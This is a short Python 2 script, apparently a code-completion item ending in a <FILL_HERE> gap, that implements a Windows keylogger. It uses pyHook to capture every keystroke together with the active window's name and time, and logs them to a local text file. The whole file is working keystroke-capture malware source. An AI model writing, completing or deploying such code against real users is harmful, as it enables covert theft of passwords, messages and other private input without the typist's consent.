# -*- coding: utf-8 -*-
"""
Created on Tue Nov 17 23:57:51 2015
@author: saptaks
"""

import pyHook, pythoncom, sys, logging
file_log = 'E:/keyloggeroutput.txt'
window_name = ''
time = 0
keylog = ''

def OnKeyboardEvent(event):
    global window_name
    global time
    global keylog
    global file_log
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    print event.Time - time
    if  window_name == event.WindowName and event.Time - time < 10000:
        keylog += chr(event.Ascii)
    else:
        window_name = event.WindowName
        time = event.Time
        logging.log(10, keylog)
        keylog = "Window Name: " + str(window_name) + "::Time: " + str(time) + "::LOG: " + chr(event.Ascii)
        
    return True
    
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.Pump<FILL_HERE>